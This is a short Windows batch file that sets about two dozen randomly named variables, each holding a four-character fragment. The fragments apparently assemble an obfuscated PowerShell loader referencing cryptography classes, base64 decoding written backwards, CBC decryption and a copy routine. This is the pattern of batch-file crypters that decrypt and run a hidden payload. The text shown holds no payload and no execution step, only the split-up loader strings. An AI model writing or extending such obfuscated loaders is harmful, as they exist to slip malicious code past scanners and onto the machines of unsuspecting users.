@echo off
set "jRoeAyvpxK=ew-O"
set "zznGyJZncm=yTo("
set "AwnaVVluKj=yste"
set "KRwoRGhnnl=16] "
set "qLqTdYpVkZ=k; }"
set "fokYoryeXQ=.Cry"
set "mzBEuJxMau=::('"
set "WjJDsZmsky=ode]"
set "QOOJlcQNxk=1..-"
set "EoGxrotUnV=y.Ci"
set "vuFdqvwDyo=1] -"
set "UmUVOOtFAZ= = $"
set "cAbQpftgYN=iPDl"
set "mCPEPmXOjd=.Cry"
set "xDymnpNYyM=zuZI"
set "FkwYcqMhIR=te ="
set "fqxBRMgxMY=orF'"
set "MkpuYgaHut=saBm"
set "khiDzAvJSY=]::C"
set "pVvAxeOmLc=;$ct"
set "zgejGtfivO='[-1"
set "auAbMdtedU=oL'["
set "uotAjqrFyD=Conv"
set "eLXHMhHQxU=.Cop"
set "hxXtBvfkMM=BC;$"
set "kZSsJfJGqE=stem"
set "jaDEKASpdi=($nv"
